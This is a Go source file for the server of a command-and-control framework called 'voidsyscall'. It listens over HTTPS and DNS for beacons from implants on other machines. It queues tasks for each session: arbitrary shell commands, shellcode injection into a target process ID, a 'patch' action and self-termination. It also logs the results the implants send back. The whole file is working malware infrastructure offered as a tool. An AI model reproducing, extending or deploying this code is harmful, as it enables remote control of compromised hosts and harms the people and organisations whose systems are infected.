package server

import (
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/VoidSecSoftwares/voidsyscall/channels"
)

type Server struct {
	sessions *SessionManager
	config   *ServerConfig
	ctx      context.Context
	cancel   context.CancelFunc
}

type ServerConfig struct {
	HTTPAddr   string
	HTTPSPort  int
	DNSAddr    string
	DNSPort    int
	ICMPAddr   string
	BeaconPath string
	CertFile   string
	KeyFile    string
	LogFile    string
}

type TaskType uint8

const (
	TaskShell  TaskType = 0x01
	TaskInject TaskType = 0x02
	TaskPatch  TaskType = 0x03
	TaskSleep  TaskType = 0x04
	TaskExit   TaskType = 0xFF
)

func NewServer(cfg *ServerConfig) *Server {
	ctx, cancel := context.WithCancel(context.Background())
	return &Server{
		sessions: NewSessionManager(),
		config:   cfg,
		ctx:      ctx,
		cancel:   cancel,
	}
}

func (s *Server) Run() error {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.SetOutput(os.Stdout)

	log.Printf("[+] voidsyscall C2 starting")
	log.Printf("[+] HTTP: %s:%d", s.config.HTTPAddr, s.config.HTTPSPort)
	log.Printf("[+] DNS: %s:%d", s.config.DNSAddr, s.config.DNSPort)
	log.Printf("[+] ICMP: %s", s.config.ICMPAddr)

	go s.startHTTPServer()
	go s.startDNSServer()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	<-sigChan
	log.Printf("[!] Shutting down...")
	s.cancel()
	time.Sleep(1 * time.Second)
	return nil
}

func (s *Server) startHTTPServer() {
	httpCfg := &channels.Config{
		HTTPAddr:   s.config.HTTPAddr,
		HTTPSPort:  s.config.HTTPSPort,
		BeaconPath: s.config.BeaconPath,
		JitterMin:  0,
		JitterMax:  0,
	}

	ch, err := channels.New(channels.ChannelHTTPS, httpCfg)
	if err != nil {
		log.Printf("[-] HTTP channel error: %v", err)
		return
	}

	type tlsListener interface {
		ListenWithTLS(ctx context.Context, addr, certFile, keyFile string, handler func(*channels.Message) *channels.Message) error
	}

	if tlsCh, ok := ch.(tlsListener); ok {
		err = tlsCh.ListenWithTLS(s.ctx, fmt.Sprintf("%s:%d", s.config.HTTPAddr, s.config.HTTPSPort),
			s.config.CertFile, s.config.KeyFile, s.handleMessage)
	} else {
		err = ch.Listen(s.ctx, fmt.Sprintf("%s:%d", s.config.HTTPAddr, s.config.HTTPSPort), s.handleMessage)
	}
	if err != nil && err != http.ErrServerClosed {
		log.Printf("[-] HTTP listen error: %v", err)
	}
}

func (s *Server) startDNSServer() {
	dnsCfg := &channels.Config{
		DNSAddr:  s.config.DNSAddr,
		DNSPort:  s.config.DNSPort,
		JitterMin: 0,
		JitterMax: 0,
	}

	ch, err := channels.New(channels.ChannelDNS, dnsCfg)
	if err != nil {
		log.Printf("[-] DNS channel error: %v", err)
		return
	}

	addr := fmt.Sprintf("%s:%d", s.config.DNSAddr, s.config.DNSPort)
	err = ch.Listen(s.ctx, addr, s.handleMessage)
	if err != nil {
		log.Printf("[-] DNS listen error: %v", err)
	}
}

func (s *Server) handleMessage(msg *channels.Message) *channels.Message {
	session := s.sessions.GetOrCreate(msg.ID, nil, "unknown")

	log.Printf("[+] Beacon from %x (channel: %s)", msg.ID[:8], session.Channel)

	if msg.Type == 0x01 {
		// Beacon — check for queued tasks
		task := session.DequeueTask()
		if task == nil {
			// No task, send sleep
			return &channels.Message{
				Type: 0x01,
				Data: []byte{0x04, 0x00, 0x00, 0x00, 0x00}, // TaskSleep, 0 seconds
			}
		}

		return &channels.Message{
			Type: 0x01,
			Data: append([]byte{task.Type}, task.Data...),
		}
	}

	if msg.Type == 0x02 {
		// Result
		if len(msg.Data) < 1 {
			return nil
		}
		status := msg.Data[0]
		output := msg.Data[1:]

		result := &Result{
			Status: status,
			Output: output,
		}
		copy(result.TaskID[:], msg.ID[:])
		session.AddResult(result)

		log.Printf("[+] Result from %x: status=%d output=%s", msg.ID[:8], status, string(output))

		return &channels.Message{Type: 0x02, Data: []byte{0x00}}
	}

	return nil
}

func (s *Server) EnqueueTask(sessionID [16]byte, taskType TaskType, data []byte) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}

	taskID := [16]byte{}
	for i := range taskID {
		taskID[i] = byte(time.Now().UnixNano() >> uint(i*8))
	}

	task := &Task{
		Type: uint8(taskType),
		Data: data,
	}
	copy(task.ID[:], taskID[:])

	session.EnqueueTask(task)
	log.Printf("[+] Task queued for %x: type=%d", sessionID[:8], taskType)
	return nil
}

func (s *Server) GetSession(id [16]byte) (*Session, bool) {
	return s.sessions.Get(id)
}

func (s *Server) AllSessions() []*Session {
	return s.sessions.All()
}

func (s *Server) ListSessions() string {
	sessions := s.sessions.All()
	if len(sessions) == 0 {
		return "No active sessions"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Active sessions: %d\n", len(sessions)))
	for _, sess := range sessions {
		sb.WriteString(fmt.Sprintf("  [%x] channel=%s last=%s tasks=%d results=%d\n",
			sess.ID[:8],
			sess.Channel,
			sess.LastBeacon.Format(time.RFC3339),
			len(sess.Queue),
			len(sess.Results),
		))
	}
	return sb.String()
}

func (s *Server) RunShell(sessionID [16]byte, cmd string) error {
	data := []byte(cmd)
	return s.EnqueueTask(sessionID, TaskShell, data)
}

func (s *Server) RunInject(sessionID [16]byte, pid uint32, shellcode []byte) error {
	data := make([]byte, 4+len(shellcode))
	binary.LittleEndian.PutUint32(data[:4], pid)
	copy(data[4:], shellcode)
	return s.EnqueueTask(sessionID, TaskInject, data)
}

func (s *Server) PatchTarget(sessionID [16]byte, patchType byte) error {
	return s.EnqueueTask(sessionID, TaskPatch, []byte{patchType})
}

func (s *Server) StopSession(sessionID [16]byte) error {
	return s.EnqueueTask(sessionID, TaskExit, nil)
}
